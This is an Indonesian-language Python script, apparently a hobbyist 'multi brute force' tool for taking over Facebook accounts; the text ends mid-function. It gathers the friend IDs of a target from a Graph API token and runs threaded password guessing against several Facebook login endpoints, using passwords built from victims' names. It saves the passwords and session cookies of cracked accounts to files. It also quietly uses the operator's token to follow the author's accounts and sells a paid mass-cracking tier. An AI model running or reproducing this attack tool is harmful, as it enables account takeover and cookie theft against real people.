#YANG RICODE NAK LONTE MAMAKNYA MATI
import os, sys, time, re, json, requests, bs4, random, calendar, datetime,subprocess, logging, rich
from concurrent.futures import ThreadPoolExecutor as dimzzXD
from datetime import datetime
from bs4 import BeautifulSoup as parser
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
import time
from concurrent.futures import ThreadPoolExecutor as tread
from rich import print
from rich.panel import Panel
from rich.progress import Progress
from rich.progress import SpinnerColumn
from rich.progress import BarColumn
from rich.progress import TextColumn
from rich.progress import TimeElapsedColumn
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
## Warna pepek cewek semok :v
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA YANG UDAH GAK PERAWAN :V
J = '\033[38;2;255;127;0;1m' # ORANGE
KhamdihiGanteng = [ P,M,H,K,B,U,O,N ] # warna janda 
user, mi, status_foll, cr, ok, cp, id, user, loop, looping = [], [], [], [], [], [], [], [], 0, 1
ta = current.year
bu = current.month
ha = current.day
op = bulan_[nTemp]
waktu = '%s-%s-%s'%(ha,op,ta)
waktu.split('/')
## NAMPUNG KANG REKODE MASE
loop = 0
ok = []
cp = []
ttl = []
fw = []
jq = 0
bf = 0
bg = 0
jg = 0
pq = 0
id = []
lq = []
iz = []
kx = 0
opq = []
olq = []
loop = 0
id = []
ok = []
cp = []

## USER-AGENT ORI BAWAN
try:
	user = ('NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+')
	open('user.txt','w').write(user)
except:
	pass
## RANDOM UA
try:ugen = open('user.txt','r').read().splitlines()
except:ugen = ['Mozilla/5.0 (Linux; Android 8.1.0; BBB100-1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36']
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = ['Mozilla/5.0 (Linux; Android 8.1.0; BBB100-1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36']
## MLAKU
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.02)
def folder():
	try:os.mkdir('okeh')
	except:pass
	try:os.mkdir('cepeh')
	except:pass
	

def banner():
	print(Panel('       [red]•[yellow]•[green]•[red] WELCOME[white] TO XAVIER MULTI BRUTE [red]FORCE [red]•[yellow]•[green]•'))
	print(Panel("[red]____  ___    _____ _____________________ \n\   \/  /   /     \\______   \_   _____/ \n \     /   /  \ /  \|    |  _/|    __) [white]AU:DimzzXD\n [white]/     \  /    Y    \    |   \|     \ \n/___/\  \ \____|__  /______  /\___  / [red]GIT:Xavierous\n  [white]    \_/         \/       \/     \/  ",title="[red]•[yellow]•[green]•"))


class login:


	def __init__(self):
		self.ada = []
	def __login__(self):
		os.system('clear')
		banner()
		token = input('%s/%s/%s/%s MASUKIN TOKEN LU : '%(M,K,H,P))
		if token in ['']:
			time.sleep(2);login().__login__()
		else:
			try:
				cc = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['name']
				open('token.x','w').write(token)
				print(Panel('[green] [>_<]Login berhasil %s'%(cc)))
				print(Panel('[>_<] BENTAR FOLLOW AKUN AUTHOR DULU'))
				time.sleep(2)
				self.bot()
			except KeyError:
				jalan(' %s/%s/%s/%s Token error coba ganti akun tumbal!'%(M,K,H,N))
			login().__login__()
	def bot(self):
		# HARGAI SEDIKIT AJA JANGAN GANTI BOT FOLOW NYA CUKUP TAMBAHKAN, TERIMA KASIH BUAT YG PENGERTIAN :V
		try:
			toket = open('token.x','r').read()
		except IOError:
			jalan('\n %s/%s/%s/ Token MATI!'%(M,K,H,N));time.sleep(1);login().__login__()
		requests.post('https://graph.facebook.com/100019311764879/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/100016046941321/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/100017814797610/subscribers?access_token=' + toket)
		menu().main()

class menu:

	def __init__(self):
		self.uid = []
	def main(self):
		os.system('clear')
		try:
			toke = open('token.x','r').read()
		except IOError:
			print('LOGIN [green]DULU');time.sleep(2);login().__login__()
		try:		 
			r = requests.get('https://graph.facebook.com/me?access_token=%s'%(toke)).json()['name']
		except KeyError:
			print('LOGIN [red]GAGAL ...');os.system('rm -rf token.x');time.sleep(2);login().__login__()
		except requests.exceptions.ConnectionError:
			exit(' %sGada %skoneksi'%(M))
		try:
			akss = open('license.txt','r').read()
		except IOError:
			akss = '-'
		banner()
		IP = requests.get('https://api.ipify.org').text
		jalan('%s%s[ >< ] SELAMAT DATANG DI TOOLS GUA TOD >_< \x1b[1;92m%s%s '%(H,N,r,N))
		print('[ >< ] ALAMAT RUMAH LU  : %s'%(IP))
		print('[ >< ] TOOLS : GRATISAN')
		print(Panel('[ME] CRACK DARI PERTEMANAN SENDIRI \n[01] CRACK DARI PERTEMANAN PUBLIK\n[02] CEK RESSULT \n[03] DONASI\n[00] LOG OUT\n[Z]  UPGRADE [green]PREMIUM',title='[red]•[yellow]•[green]•'))

		self.pilih()

	def pilih(self):
		usna = input(' %s/%s/%s/%s '%(M,K,H,N))
		if usna in ['']:
			print(' %s'%(N))
			print(' %s/%s/%s/%s STRESS'%(M,K,H,N));time.sleep(2);menu().main()
		elif usna in ['me','ME']:
			try:
				token = open('token.x','r').read()
			except IOError:
				os.system('rm -rf token.x')
				exit(' %s/%s/%s/%s CEK TOKEN LU'%(M,K,H,N))
			try:
				lmt = input(' %s/%s/%s/%s LIMIT ID : '%(M,K,H,N))
				r = requests.get('https://graph.facebook.com/me?fields=friends.limit(%s)&access_token=%s'%(lmt,token))
				z = json.loads(r.text)
				id = []
				for w in z['friends']['data']:
					id.append(z['id'] + '<=>' + w['name'])
			except KeyError:
				print(' %s/%s/%s/%s Akun anda tidak publik...'%(M,K,H,N));time.sleep(2);menu().main()
			else:
				crack().fbeh(id)
		elif usna in ['1','01']:
			try:
				token = open('token.x','r').read()
			except IOError:
				os.system('rm -rf token.x')
				exit(' %s/%s/%s/%s Coba jalankan ulang !'%(M,K,H,N))
			try:
				
				idt = input(' %s/%s/%s/%s MASUKAN ID TARGET : '%(M,K,H,N))
				jalan(' %s/%s/%s/%s USER FREE HANYA BISA DUMP 1K ID'%(M,K,H,N))
				r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(1000)&access_token=%s'%(idt,token))
				e = json.loads(r.text)
				id = []
				for u in e['friends']['data']:
					id.append(u['id'] + '<=>' + u['name'])
			except KeyError:
				jalan(' %s/%s/%s/%s ID %s TIDAK PUBLIK !!! '%(M,K,H,N,idt));time.sleep(2);menu().main()
			else:	
				crack().fbeh(id)
		elif usna in ['2','02']:
			print(Panel('[01] CEK HASIL OK\n[02] CEK HASIL CP\n[00] KEMBALI', title='[red]•[yellow]•[green]•'))
			hsl = input(' %s/%s/%s/%s PILIH : '%(M,K,H,N))
			if hsl in ['1','01']:
				hasil_ok = open('Ok.txt','r').read()
				if len(hasil_ok) != 0:
					print('\n')
					print(Panel('HASIL OKE'))
					os.system('cat Ok.txt');exit()
				else:
					print(panel(' GADA HASIL OK AWIKWOK :('%(N,O,N)))
			elif hsl in ['2','02']:
				hasil_cp = open('Cp.txt','r').read()
				if len(hasil_cp) != 0:
					print('\n')
					print(Panel(' HASIL CP LU]'))
					os.system('cat Cp.txt');exit()
			else:
				menu().main()
		elif usna in ['0','00']:
			os.system('rm -rf token.x');exit()
		elif usna in ['3','03']:
			print(Panel('JIKA ANDA INGIN DONASI CUKUP MEMBERIKAN PULSA/KUOTA\nAGAR AUTHOR SEMANGAT LAGI MEMBUAT SCRIPT - SCRIPT BRUTE FORCE [cyan]FACEBOOK.\n\n[white]NOMOR AUTHOR : [red]+6283182917830', title=('DONASI'), subtitle=('TERIMAKASIH:)')));exit()
		elif usna in ['z','Z']:
		    jalan(' %s/%s/%s/%s UPGRADE LAH PREMIUM AGAR DAPAT MENGAKSES SEMUA FITUR'%(M,K,H,N))
		    print(Panel('[01] CRACK PERTEMANAN PUBLIK [ MASALL ] UNLIMITED DUMP.\n[02] DUMP PUBLIK 5K ID', title=('FITUR')))
		    print(Panel('[red] 120K PERMANEN\n[red] 50K PERBULAN\n[red] 30K PERMINGGU', title=('UPGRADE')))
		    print(Panel('NO WA: [red] 081376042887'));exit
		 	
		 
def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('%s --> %s • %s '%(H,str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('%s * --> %s • %s '%(K,str(user), str(pw)))
        break
  except: pass

def khamdihi(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	ses = requests.Session()
	#......
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print(" • Akun Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))))
		num = 0
		for _ in xe:
			num += 1
			print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print(" • Total Opsi Yang Tersedia  "+str(len(ngew)))
		for opt in range(len(ngew)):
			print("      " +str(opt+1)+" " +ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s[%s!%s] %s"%(P,M,P,oh))
	else:
		print("%s[%s!%s] Error Login Failed!\n"%(N,M,N))


class crack:

	def __init__(self):
		self.id = []
	def fbeh(self,id):
		self.id = id
		print(Panel('[white] TOTAL ID : '+str(len(id))))
		kham = input(' %s/%s/%s/%s Gunakan PW Manual Y/T ? : '%(M,K,H,N))
		if kham in ['']:
			print(' %s/%s/%s/%s STRESS'%(M,K,H,N));time.sleep(2);crack().fbeh(id)
		elif kham in ['y','Y','Iya','iya']:
			print(panel('Gunakan sandi dengan koma sebagai pemisah\ncontoh : assalamualaikum,bismillah,sayang,masjid'))
			while True:
				pw = input(' %s/%s/%s/%s Masukan password : '%(M,K,H,N))
				if pw in ['']:
					print(panel('[red]Jangan kosong'))
				elif len(pw)<=5:
					print(' %s[%s!%s] Password harus ada 6 kata/ lebih !!'%(N,M,N))
				else:
					def manual(xnxx=None):
						print('%s '%(N))
						mani = input(' %s[%s•%s] Metode : '%(N,O,N))
						if mani in ['']:
							print(' %s[%s!%s] Jangan kosong mmk'%(N,M,N));self.manual()
						elif mani in ['1','01']:
							print(panel('AKUN OK TERSIMPAN DI FILE : [green]Ok.txt[white]\n AKUN CP TER SIMPAN DI FILE : [red]Cp.txt[white]',title='[red]•[yellow]•[green]•'))
							with dimzzXD(max_workers=30) as dihi:
								for me in self.id:
									try:
										Nufikha = me.split('<=>')[0]
										dihi.submit(self.b_api, Nufikha, xnxx)
									except: pass
							exit()
						elif mani in ['2','02']:
							print(panel('AKUN OK TERSIMPAN DI FILE : [green]Ok.txt[white]\n AKUN CP TER SIMPAN DI FILE : [red]Cp.txt[white]'))
							with dimzzXD(max_workers=30) as dihi:
								for me in self.id:
									try:
										Nufikha = me.split('<=>')[0]
										dihi.submit(self.mbasic,Nufikha,xnxx)
									except: pass
							exit()
						elif mani in ['3','03']:
							print(panel('AKUN OK TERSIMPAN DI FILE : [green]Ok.txt[white]\n AKUN CP TER SIMPAN DI FILE : [red]Cp.txt[white]'))
							with dimzzXD(max_workers=30) as dihi:
								for me in self.id:
									try:
										Nufikha = me.split('<=>')[0]
										dihi.submit(self.metod2, Nufikha, xnxx)
									except: pass
							exit()
					print(Panel('[01] METHODE FREE\n [02]METHODE mbasic\n [03]METHODE MOBILE [green]REKOMENDASI'))
					manual(pw.split(','))
					break
		elif kham in ['t','T','tidak','Tidak']:
			print(Panel('[01] METHODE FREE\n[02] METHODE mbasic\n[03] METHODE MOBILE [green] REKOMENDASI', title='[red]•[yellow]•[green]•'))

			self.otomatis()
	def otomatis(self):
		oto = input(' %s/%s/%s/%s METHODE : '%(M,K,H,N))
		if oto in ['']:
			print('[%s!%s] jangan kosong'%(O,N));self.otomatis()
		elif oto in ['1','01']:
			self.free()
		elif oto in ['2','02']:
			self.mbasic()
		elif oto in ['3','03']:
			self.mobilez()
		else:
			print('STRESS');self.otomatis()
	def free(self):
		print(Panel(' AKUN OK AKAN TERSIMPAN DI FILE : Ok.txt\n AKUN CP AKAN DI SIMPAN DI FILE : Cp.txt\n JIKA TIDAK MENDAPATKAN HASIL GUNAKAN MODE [red]PESAWAT[white]\n SELAMA 2 DETIK'))
		with dimzzXD(max_workers=30) as dihi:
			for me in self.id:
				try:
					uid, name = me.split('<=>')
					sempak = name.split(' ')
					nun = sempak[0]
					if len(nun)>=6:
						pwx = ['123456','sayang','sayangku','bismillah','anjing','bangsat','katasandi','sandi123']
						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
					elif len(nun)<=2:
						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
					elif len(nun)<=5:
						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
					else:
						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
					dihi.submit(self.b_api, uid, pwx)
				except Exception as e:os.sys.exit(e)
				except:pass
		exit()
	def mbasic(self):
		print(Panel(' AKUN OK AKAN TERSIMPAN DI FILE : Ok.txt\n AKUN CP AKAN DI SIMPAN DI FILE : Cp.txt\n JIKA TIDAK MENDAPATKAN HASIL GUNAKAN MODE [red]PESAWAT[white]\n SELAMA 2 DETIK'))
		with dimzzXD(max_workers=30) as dihi:
			for me in self.id:
				try:
					uid, name = me.split('<=>')
					sempak = name.split(' ')
					nun = sempak[0]
					if len(nun)>=6:
						pwx = ['123456','sayang','sayangku','bismillah','anjing','bangsat','katasandi','sandi123']
						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
					elif len(nun)<=2:
						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
					elif len(nun)<=5:
						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
					else:
						pwx = [nun, nun+'123', nun+'1234', nun+'12345', name]
					dihi.submit(self.mbasic, uid, pwx)
				except Exception as e:os.sys.exit(e)
				except:pass
		exit()

	def mobilez(self):
		print(Panel(' AKUN OK AKAN TERSIMPAN DI FILE : Ok.txt\n AKUN CP AKAN DI SIMPAN DI FILE : Cp.txt\n JIKA TIDAK MENDAPATKAN HASIL GUNAKAN MODE [red]PESAWAT[white]\n SELAMA 2 DETIK'))
		with dimzzXD(max_workers=30) as dihi:
			for nama in self.id:
				try:
					uid, name = nama.split('<=>')
					gas = name.split(' ')
					nun = gas[0]
					if len(nun)>=6:
						pwx = ['pakistan','pakistan1','pakistan12','pakistan123','pakistan1234','pakistan12345','pakistan786','786786786']
					elif len(nun)<=1:
						pwx = [nun, nun+'123', nun+'1234', nun+'12', nun+'1', nun+'786', nun+'12345', name]
					elif len(nun)<=2:
						pwx = [nun, nun+'123', nun+'1234', nun+'12', nun+'1', nun+'786', nun+'12345', name]
					elif len(nun)<=5:
						pwx = [nun, nun+'123', nun+'1234', nun+'12', nun+'1', nun+'786', nun+'12345', name]
					else:
						pwx = [nun, nun+'123', nun+'1234', nun+'12', nun+'1', nun+'786', nun+'12345', name]
					dihi.submit(self.metod2, uid, pwx)
				except Exception as e:os.sys.exit(e)
				except:pass
		exit()
	def b_api(self,user,pwx): # Kamu jahat :v
		global loop,ok,cp
		eram = random.choice([M,K,H,U,P,N])
		nufi = random.choice([N,P,U,H,K,M])
		sys.stdout.write('\r %s* %s[%s>_<%s] %s/%s [OK:%s - CP:%s] %s*'%(eram,N,O,N,loop,len(self.id),len(ok),len(cp),nufi));sys.stdout.flush() # Lo kontol...
		try:
			for pw in pwx:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
				headers_ = {"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://free.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if "c_user" in ses.cookies.get_dict():
					try:
						coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						print('\r %s--> %s • %s • %'%(H,user,pw,coki))
						cek_apk(coki)
						ok.append("%s • %s • %s "%(user,pw,coki))
						open('Ok.txt', 'a').write(" --> %s • %s • %s\n"%(user,pw,coki))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print('\r %sOK %s • %s • %s '%(H,user,pw,coki))
					ok.append('%s • %s • %s'%(user,pw,coki))
					open('Ok.txt', 'a').write(' --> %s • %s • %s\n'%(user,pw,coki))
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						dihi = open('token.x', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={dihi}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print('\r %s--> %s • %s '%(K,user,pw))
						cp.append("%s • %s"%(user,pw,))
						open('Cp.txt', 'a').write(" --> %s • %s \n"%(user,pw))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print('\r %sCP %s • %s           '%(K,user,pw))
					cp.append('%s • %s'%(user,pw))
					open('Cp.txt', 'a').write(" --> %s | %s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
                        time.sleep(31)
                        loop += 1
                        self.b_api(user,pwx)
	def metod2(self,user,pwx):
		global loop,ok,cp
		sys.stdout.write('\r proses %s/%s [OK:%s] <--> [CP:%s]' % (loop, len(self.id), len(ok), len(cp)))
		sys.stdout.flush()
		ua = random.choice(ugen)
		ua2 = random.choice(ugen2)
		ses = requests.Session()
		for pw in pwx:
			try:
				tix = time.time()
				ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
				p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
				dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
				po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
				if "checkpoint" in po.cookies.get_dict().keys():
					print('\r [yellow]╚═[CP] %s • %s'%(user,pw))
					cp.append("%s|%s"%(user, pw))
					open("cp.txt","a").write("%s|%s\n"%(user, pw))
					open("checkcp.txt","a").write("--> %s|%s\n"%(user, pw))
					break
				elif "c_user" in ses.cookies.get_dict().keys():
					coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					print('\r [green]╚═[OK] %s • %s'%(user,pw))
					open("ok.txt","a").write("--> %s|%s|%s\n"%(user, pw, coki))
					break
				else:
					continue
			except requests.exceptions.ConnectionError:
				time.sleep(31)
		loop+=1

def mbasic(self,user,pwx):
		global loop,ok,cp
		asw = random.choice([M,K,H,U])
		mmk = random.choice([K,M,U,H])
		sys.stdout.write('\r %s* %s[%scrack%s] %s/%s [OK:%s CP:%s] %s* '%(asw,N,H,N,loop,len(self.id),len(ok),len(cp),mmk));sys.stdout.flush()
		try:
			for pw in pwx:
				pw = pw.lower()
				ses = requests.Session()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
				headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
